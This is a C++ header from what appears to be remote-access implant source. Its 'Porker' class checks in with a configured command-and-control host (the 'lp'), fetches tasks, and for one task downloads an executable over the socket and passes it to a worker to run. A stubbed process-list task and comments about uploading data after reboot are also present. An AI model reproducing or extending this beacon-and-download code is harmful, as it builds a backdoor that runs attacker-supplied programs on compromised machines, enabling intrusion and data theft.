#ifndef porker_h
#define porker_h

#include "SmallStuff.h"
#include "Groundhog.h"
#include "Bacon.h"
#include "Piglet.h"

/*
	The constructor takes no arguments.
	Call some sort of startup function.
	Create the groundhog.
	call a groundhog query that returns the pigconfig
	in pigRun pass the config
	write a series of parse functions each taking an int
	each parser will interact manage
*/

class Porker {

private:
	pigconfig bigPigConfig;
	Groundhog puxPhil;
	Bacon *bcnPTR;
	oink hello;
	pigletTask pgltTask;
	Piglet *worker;

public:
	Porker();
	void pigPoke();
	unsigned int getOinkTime();
};

//=================== end declaration =======================//

Porker::Porker()
{
	printf("-Porker initializing.\n");
	ZeroMemory(&bigPigConfig, sizeof(pigconfig));
	puxPhil.getConfig(bigPigConfig);
	printf("-Config returned with id %x\n", bigPigConfig.porker_id);

	/* In the future depending on the status of the implant before reboot,
	   the initial oink will need to inform the lp of any data that needs
	   to be uploaded. OC_CONT
	*/
}

void Porker::pigPoke()
{
	printf("-Pig poke called.\n");
	printf("-Creating bacon with ip of %s and port of %d\n", bigPigConfig.hampost, bigPigConfig.hamport);
	ZeroMemory(&pgltTask,sizeof(pigletTask));
	if(bcnPTR = new Bacon(bigPigConfig.hampost, bigPigConfig.hamport))//every poke creates a new beacon
	{

		hello.PIG_ID = bigPigConfig.porker_id;							//configure the oink
		hello.oinkCode = OC_QUERY;
		
		printf("-Calling sendoink.\n");	
	
		if(bcnPTR->sendOink(hello))										//send the oink
		{
			if(bcnPTR->getOinkReply(pgltTask.TSK))								//get the task
			{	
				hello.oinkCode = OC_ACK;
				printf("Changing oinkCode to an ACK, snding RGR.\n");
				if(bcnPTR->sendOinkRGR(hello))										//acknowledge the task
				{
					printf("Got a reply, checking task id\n");
					if(pgltTask.TSK.taskID == 1)											//if the TID is not zero
					{
						printf("Starting Task\n");
						pgltTask.BFFR = new char[pgltTask.TSK.taskSize+1];			//allocate a buffer big enough for the file
						bcnPTR->getTaskData(pgltTask.BFFR, pgltTask.TSK.taskSize);	//get the data from the socket
						//this will download our exe for now
						//for now we will cleanup after the piglet has run, in the future we will have a linked list of pigletTasks and spawn a thread for each one
						worker = new Piglet(pgltTask);
					}
					else if(pgltTask.TSK.taskID == 4)							//get a process list
					{

					}
					else if(pgltTask.TSK.taskID == 0)
					{
						printf("-No tasking this time\n");
					}
				}
			}
		}
	}
	delete bcnPTR;

}

unsigned int Porker::getOinkTime()
{
	return bigPigConfig.oinkInterval;
}

#endif